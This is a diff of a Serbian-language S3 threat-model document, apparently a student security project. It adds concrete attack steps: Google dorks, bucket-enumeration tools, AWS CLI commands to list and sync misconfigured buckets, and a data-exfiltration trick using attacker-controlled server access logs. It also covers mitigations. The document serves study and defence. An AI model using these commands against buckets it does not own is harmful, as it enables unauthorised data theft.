@@ -1,6 +1,6 @@
 # AWS S3 eksterni servis
 
-Amazon Simple Storage Service (S3) je usluga za skladištenje podataka u oblaku. Dostupan je u različitim AWS regijama širom sveta. Svaka AWS regija je fizički odvojena lokacija sa svojim resursima i infrastrukturom. Korisnici mogu da odaberu AWS regiju u kojoj žele da uspostave svoje skladište podataka. Bucket je osnovna jedinica organizacije podataka koji ima jedinstveno ime unutar AWS regije. Svaki bucket ima objekte, a objekat ima jedinstveni ključ unutar bucket-a. Ključ objekta predstavlja njegovu putanju unutar bucket-a kao i njegov jedinstveni identifikator. Objekat je osnovna jedinica podatka koji se čuva.<br>
+Amazon Simple Storage Service (S3) [[1]](#reference) je usluga za skladištenje podataka u oblaku. Dostupan je u različitim AWS regijama širom sveta. Svaka AWS regija je fizički odvojena lokacija sa svojim resursima i infrastrukturom. Korisnici mogu da odaberu AWS regiju u kojoj žele da uspostave svoje skladište podataka. Bucket je osnovna jedinica organizacije podataka koji ima jedinstveno ime unutar AWS regije. Svaki bucket ima objekte, a objekat ima jedinstveni ključ unutar bucket-a. Ključ objekta predstavlja njegovu putanju unutar bucket-a kao i njegov jedinstveni identifikator. Objekat je osnovna jedinica podatka koji se čuva.<br>
 Kao i svaki drugi servis tako je i AWS S3 podložan sigurnosnim pretnjama.
 1. Neovlašćeni pristup osetljivim podacima [P1] <br>
 Ključni resurs koji može biti ugrožen u okviru AWS S3 usluge su bucket-i sa svojim podacima. Napadač može da pregleda podatke unutar bucket-a i na taj način, ugrožava poverljivost informacija. Ovi podaci predstavljaju vredan resurs za napadača koji ih može iskoristiti u cilju zloupotrebe, iznude ili ucene gde napadač traži novac ili nešto drugo kako ih ne bi objavio ili zloupotrebio.
@@ -13,14 +13,39 @@ Kao i u prethodnoj pretnji, ključni resurs koji je ugrožen jeste bucket sa svo
 
 ### Data Exfiltration [N1]
 
-Data exiltration, poznat kao i data extrustion, predstavlja neovlašćeni prenos ili krađu podataka koji su smešteni u S3 bucket-ovima od strane napadača. Napadač pokušava dobiti pristup osetljivim podacima koje se nalaze u bucket-ovima, pa ih preneti ili zloupotrebiti.
+Data exiltration [[2]](#reference), poznat kao i data extrustion, predstavlja neovlašćeni prenos ili krađu podataka koji su smešteni u S3 bucket-ovima od strane napadača. Napadač pokušava dobiti pristup osetljivim podacima koje se nalaze u bucket-ovima, pa ih preneti ili zloupotrebiti.
 
-Napadač prvo identifikuje AWS S3 bucket koji će mu biti cilj napada. Ovaj korak uključuje istraživanje dostupnih bucket-ova i procenu da li su podaci unutar njih vredni. Nakon toga sledi detaljna analiza bezbednosnih mera kako bi se identifikovale ranjivosti. Kradjom autentifikacionih podataka, manipulacijom pravilima pristupa ili korišćenjem ranjivosti napadač pokušava dobiti neovlašćeni pristup bucket-u. Nakon što je ostvario pristup podacima, napadač identifikuje osetljive podatke, a zatim ih prenosi na neku drugu lokaciju pod svojom kontrolom. Nakon izvršavanja napada, napadač može pokušati da sakrije tragove kako bi sprečio identifikaciju i praćenje napada. To će učiniti brisanjem logova i evidencije aktivnosti. Nakon svih ovih koraka napad je izvršen i napadač može da iskoristi podatke u skladu sa svojim ciljevima. Na ovaj način Data Exfiltration ostvaruje pretnju 'Neovlašćeni pristup osetljivim podacima' [P1]. Napadač može da proda osetljive informacije na crnom tržištu, da vrši iznudu ili ucenu onoga kome je podatke ukrao.
+Napadač prvo identifikuje AWS S3 bucket koji će mu potencijalno biti cilj napada. To može učiniti koristeći različite komande kao što je Google dorks za pronalaženje S3 bucket-a koji su povezani sa određenim sajtom (komanda: site:s3.amazonaws.com <site.com>). Ovo je pretraga koja se vrši putem Google pretraživača kako bi se identifikovali potencijalni ciljni bucket-i. Drugi način bi bilo korišćenje CLI alatki za enumeraciju bucket-a kao što su Slurp, Bucket_finder, S3Scanner i Cloudlist. Ove alatke pomažu u identifikaciji dostupnih bucket-a, pristupajući informacijama o njihovim konfiguracijama i sadržaju.
 
-#### Mitigacije
+Nakon pronalska potencijalnih ciljnih bucket-a sledi analiza bezbednosnih mera kako bi se identifikovale ranjivosti kao i procena da li su podaci unutar njih vredni. Da bi se proverila konfiguracija amazon S3 bucket-a potrebno je instalirati AWSCLI. Bitno je napomenuti da AWSCLI mora biti konfigurisan dodavanjem podataka o AWS nalogu, odnosno klijentskom ID-u i tajnom ključu. Nakon toga moguće je proveriti da li postoje konfiguracije koje mogu dovesti do izvršavanja napada. Kako bi se videle dozvole koristi se sledeća komanda:
+ ```
+     aws s3api get-bucket-acl --bucket <bucket-name>
+ ```
+Kako bi napadač video sadržaj u S3 bucket-u koristi sledeću komandu koja će izlistati sve datoteke i direktorijume u datom bucket-u:
+ ```
+    aws s3 ls s3://<bucket-name>
+ ```
+Ako bucket ima netačno konfigurisane dozvole, napadač može lako preuzeti podatke koristeći sledeću komandu:
+ ```
+    aws s3 sync s3://<bucket>/<path> </local/path>
+ ```
+Nakon ovih koraka napad je izvršen i napadač može da iskoristi podatke u skladu sa svojim ciljevima. Na ovaj način Data Exfiltration ostvaruje pretnju 'Neovlašćeni pristup osetljivim podacima' [P1]. Napadač može da proda osetljive informacije na crnom tržištu, da vrši iznudu ili ucenu onoga kome je podatke ukrao.
+
+Sledeći konkretan scenario napada bi se mogao prikazati ako napadač ima kontrolu nad S3 bucket-om koji se koristi za čuvanje server access logova [[3]](#reference). Napadač aktivira server access logove na ciljnom S3 bucket-u nad kojim želi izvršiti napad data exfilitration. Sa server access loggging-om svaki zahtev ka bucket-u će biti zabeležen u bucket-u za logovanje. Ovo uključuje interne AWS zahteve ili zahteve izvršene putem AWS konzole. Čak i ako je zahtev odbijen, payload koji zahtev nosi će biti poslat ka napadačevom logging bucket-u. Napadač može slati GetObject zahteve ka S3 bucket-ovima do kojih nema pristup:
+ ```
+    aws s3api get-object --bucket AttackerBucket --key ExampleDataToExfiltrate
+ ```
+Međutim, zato što kontroliše server access logove, i dalje će primati podatke kojima inače nema pristup:
+ ```
+    [..] attackerbucket […] 8.8.8.8 – […] REST.GET.OBJECT ExampleDataToExfiltrate "GET /
+    ExampleDataToExfiltrate HTTP/1.1" 403 AccessDenied 243 - 18 - "-" "UserAgentAlsoHasData " – […]
+ ```
+Na osnovu informacija iz logova napadač može rekonstruisati podatke koje je pokušao eksfiltrirati. Problem koji se javlja jeste taj što logovi koji zabeleže svaki zahtev ka bucket-u nisu nužno uređeni po vremenu dolaska. To znači da ako napadač podatke razbije na više zahteva, može se suočiti sa situacijom gde logovi stižu u nekom drugačijem redosledu. Ako pokušava da rekonstruiše podatke koji su razbijeni na više zhgteva, napadač će prvo morati razviti mehanizam koji će pravilno sortirati te logove kako bi ispravno sastavio originalne podatke.
+
+#### Mitigacije [[4]](#reference)
 
 1. Konfiguracija pristupa [M1] <br>
-Kada je konfiguracija pristupa u pitanju, potrebno je odrediti ko ima pristup kojim podacima i na koji način. Ovo podrazumeva razna podešavanja kao sto su postavljanje Identity and Access Managment - IAM politika, Bucket-Level politika, postavljanje S3 Bucket Access Control Lists - ACL-ova.<br><br>
+Kada je konfiguracija pristupa u pitanju, potrebno je odrediti ko ima pristup kojim podacima i na koji način. Ovo podrazumeva razna podešavanja kao sto su postavljanje Identity and Access Managment - IAM politika, Bucket-Level politika, postavljanje S3 Bucket Access Control Lists - ACL-ova [[5]](#reference).<br><br>
 **IAM politike** - određuju koje su radnje dozvoljene ili odbijene na AWS uslugama/resursima za određenog korisnika. IAM politike možemo da dodelimo          specifičnom korisniku, ulozi ili grupi.<br><br>
 **Bucket-Level politike** - određuju koje su radnje dozvoljene ili nisu nad specifičnim bucket-om za određene korisnike. <br><br>
 **S3 Bucket ACL** - predstavlja stari način upravljanja pristupom bucket-ima. AWS preporučuje korišćenje IAM ili Bucket-Level politika, ali još uvek postoje slučajevi u kojima ACL-ovi daju veću fleksibilnost od politika. To je jedan od razloga zašto još uvek nisu zastareli niti će biti uskoro. Najznačajnija prednost jeste što se mogu dodeljivati i bucket-ima ali i samim objektima, što nije slučaj sa politikama. Znači da postoji velika fleksibilnost nad resursima jer neki objekti mogu biti javni u privatnom bucket-u kao i obrnuto. <br><br>
@@ -37,9 +62,22 @@ Za zaštitu od Data Exfiltration napada bitno je što CloudTrail može pratiti s
 
 ### Bucket Enumeration <a id="N2">[N2]</a>
 
-Bucket Enumeration je napad koji podrazumeva otkrivanje postojanja S3 bucket-a i proveru da li su oni javni. Ovaj napad je važan korak za napadače koji planiraju potencijalne napade na podatke koji se nalaze u tim bucket-ima (kao što je Data Exfiltration [N1] ili Bucket Takeover [N3]). Medjutim može biti i deo bezbednosne analize sa ciljem otkrivanja potencijalnih rizika.
+Bucket Enumeration  [[6]](#reference) je napad koji podrazumeva otkrivanje postojanja S3 bucket-a i proveru da li su oni javni. Ovaj napad je važan korak za napadače koji planiraju potencijalne napade na podatke koji se nalaze u tim bucket-ima (kao što je Data Exfiltration [N1] ili Bucket Takeover [N3]). Medjutim može biti i deo bezbednosne analize sa ciljem otkrivanja potencijalnih rizika. 
 
-Napad počinje sa identifikacijom AWS regije u kojoj će se tražiti bucket-i. Bitno je odabrati pravu regiju jer različite regije imaju različite bucket-e. Nakon odabira regije, napadač pretražuje bucket-e. To može da radi koristeći AWS CLI (aws s3 ls - izlistava dostupne bucket-e u regiji), skripte kako bi generisao moguća imena bucket-a (nasumične kombinacije ili koristeći rečnike sa često korišćenim imenima), alate koji omogućavaju automatsko pretraživanje i identifikaciju dostupnih bucket-a (S3Scanner, Bucket Finder itd). Nakon što je pronađen javno dostupan bucket, ostvarena je pretnja 'Neovlašćen pristup osetljivim podacima' [P1].
+Prvi način na koji napad može da se izvede jeste tako što će se prvo odraditi pasivno istraživanje (PASSIVE RECON), tj identifikacija da li neki veb sajt koristi S3 bucket-e, kao i otkrivanje regije kojoj pripada. Otkrivanje regije nije obavezan korak, ali svakako može olakšati i uštedeti vreme prilikom pogađanja imena bucket-a, jer različite regije imaju različita imena bucket-a. Za ovaj korak se može koristiti nslookup u slučaju da web server koji koristi S3 bucket nije zaštićen WAF-om (Web Application Firewall). Na Slici 2.1 se vidi da je IP adresa locirana u regionu us-west-2. <br><br>
+![Slika 2.1](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/nslookup.PNG) <br>Slika 2.1<br>
+
+Sada kada napadač ima ove informacije, sledeći korak predstavlja aktivno istraživanje (ACTIVE RECON), tj izvršavanje opštih upita i enumeracija imena bucket-a. Napadač bi trebalo da izvrši enumeraciju poddomena, domena i domena najvišeg nivoa kako bi se uverio da ciljni sajt ima S3 bucket. Za pogađanje imena bucket-a, može koristiti rečnik sa često korišćenim imenima ili praveći nasumične kombinacije. Npr ako traži bucket-e koji pripadaju www.geeksforgeeks.com, tada bi trebao probati imena bucket-a poput geeksforgeeks.com ili www.geeksforgeeks.com. Kada uspe da otkrije ime bucket-a, moći če direktno posetiti automatski dodeljeni S3 URL koji daje Amazon, gde će format biti: http://bucketname.s3.amazonaws.com kao što je prikazano na Slici 2.2.<br><br>
+![Slika 2.2](https://github.com/vulinana/ZOSS-Projekat/blob/main/ModulPoslovanja/AWS-S3/Slike/bucketname.s3.amazonaws.PNG) <br>Slika 2.2<br>
+
+Još jedan način za izvođenje bucket enumeration-a bi bio upotrebom third-party alata [[7]](#reference). Postoje različiti third-party alati i skripte koje mogu automatizovati proces pronalaženja S3 bucket-a.
+Jedan od takvih alata je S3Scanner. S3Scanner je popularan alat otvorenog koda koji se koristi za identifikaciju javno dostupnih Amazon S3 bucket-a i izvlačenje interesantnih informacija iz njih. Alat se pokreće komandom sa odgovarajućim ciljnim domenom example.com:
+ ```
+     python s3scanner.py example.com
+ ```
+S3Scanner će skenirati javno dostupne bucket-e i prikazati rezultate, uključujući imena bucket-a i povezane URL-ove.
+
+Nakon što je pronađen javno dostupan bucket, ostvarena je pretnja 'Neovlašćen pristup osetljivim podacima' [P1].
 
 #### Mitigacije
 
@@ -72,15 +110,21 @@ Ukoliko je kontrola nad bucket-om već izgubljena dobro bi bilo da su podaci ši
 4. Praćenje i detekcija aktivnosti [M5] <br>
 CloudTrail omogućava praćenje svih događaja i aktivnosti unutar AWS infrastrukture, uključujući promene u konfiguraciji S3 bucket-a. Bilo kakve nepravilnosti ili promene u privilegijama i pravilima pristupa mogu biti brzo identifikovane.
 
-### Reference
-1. https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html
-2. https://docs.aws.amazon.com/prescriptive-guidance/latest/strategy-aws-semicon-workloads/prevent-unauthorized-access.html
-3. https://binaryguy.tech/aws/s3/iam-policies-vs-s3-policies-vs-s3-bucket-acls/  
-4. https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html  
-5. https://risk3sixty.com/2022/10/24/s3-buckets/
-6. https://ieeexplore.ieee.org/document/9133399?denied
-7. https://socradar.io/aws-s3-bucket-takeover-vulnerability-risks-consequences-and-detection/
+# Reference
+
+[1] https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html *
+
+[2] https://www.shehackske.com/how-to/data-exfiltration-on-cloud-1606/ *
+
+[3] https://hackingthe.cloud/aws/exploitation/s3_server_access_logs/ *
+
+[4] https://docs.aws.amazon.com/AmazonS3/latest/userguide/security-best-practices.html *
+
+[5] https://binaryguy.tech/aws/s3/iam-policies-vs-s3-policies-vs-s3-bucket-acls/ *
+
+[6] https://www.geeksforgeeks.org/s3-bucket-enumeration-and-exploitation/ *
+
+[7] https://medium.com/@aka.0x4C3DD/s3-bucket-enumeration-research-and-insights-674da26c049e *
+
+[8] https://socradar.io/aws-s3-bucket-takeover-vulnerability-risks-consequences-and-detection/ - bucket takeover
    
-
-
-
